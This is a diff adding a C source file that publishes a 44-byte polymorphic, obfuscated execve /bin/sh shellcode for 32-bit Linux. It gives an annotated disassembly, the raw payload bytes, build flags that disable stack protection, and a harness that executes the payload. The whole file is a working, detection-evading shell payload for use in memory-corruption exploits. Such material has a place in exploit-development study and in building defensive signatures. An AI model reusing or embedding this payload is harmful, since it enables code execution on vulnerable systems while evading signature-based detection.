@@ -1,0 +1,48 @@
+/*
+
+Title   : Polymorphic/obfuscated execve /bin/sh (44 bytes - 146% of the original code)
+Date    : 4th Sep 2019
+Author  : Vikrant Navalgund
+System  : Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:06:14 UTC 2016 i686 i686 i686 GNU/Linux
+
+To build:
+gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+
+00000000  31C9              xor ecx, ecx
+00000002  F7E9              imul ecx
+00000004  51                push ecx
+00000005  040B              add al, 0xb
+00000007  EB16              jmp short 0x1f
+00000009  5E                pop esi
+0000000A  89F7              mov edi, esi
+0000000C  60                pushad
+0000000D  B108              mov cl, 0x8
+0000000F  8A06              mov al, [esi]
+00000011  C0C802            ror al, byte 0x2
+00000014  AA                stosb
+00000015  46                inc esi
+00000016  E2F7              loop 0xf
+00000018  61                popad
+00000019  87E6              xchg esp, esi
+0000001B  87DC              xchg ebx, esp
+0000001D  CD80              int 0x80
+0000001F  E8E5FFFFFF        call dword 0x9
+00000024  BC89A5B9BC        mov esp, 0xbcb9a589
+00000029  BC                db 0xbc
+0000002A  CDA1              int 0xa1
+
+*/
+
+#include <stdio.h>
+
+unsigned char code[] = \
+"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x16\x5e\x89\xf7\x60\xb1\x08\x8a"
+"\x06\xc0\xc8\x02\xaa\x46\xe2\xf7\x61\x87\xe6\x87\xdc\xcd\x80\xe8"
+"\xe5\xff\xff\xff\xbc\x89\xa5\xb9\xbc\xbc\xcd\xa1";
+
+main()
+{
+    printf("Shellcode Length: %d\n", sizeof(code)-1);
+    int (*ret)() = (int(*)())code;
+    ret();
+}
